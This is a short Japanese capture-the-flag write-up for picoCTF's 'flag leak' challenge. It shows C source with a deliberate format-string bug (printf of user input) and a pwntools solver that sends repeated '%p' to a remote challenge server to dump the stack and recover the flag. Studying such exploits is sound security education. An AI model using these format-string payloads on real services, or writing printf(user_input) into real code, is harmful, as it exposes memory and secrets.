# flag leak
以下のコードが渡される
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}

```

`vuln`にてFSAが可能
`flag`はスタック上に載っているのでスタックの値をとにかく吐き出させる

## solver
```python
from pwn import *

# io = process("./vuln")
io = remote("saturn.picoctf.net", 57806)
io.readuntil(b"Tell me a story and then I'll tell you one >>")
io.sendline(b"%p" * 70)
io.recvline()
stack = io.recvall()
print(stack)
```

スタック内のhexを文字に戻すとフラグが出てくる
リトルエンディアンのため、4文字ごとに逆順になっていることに注意
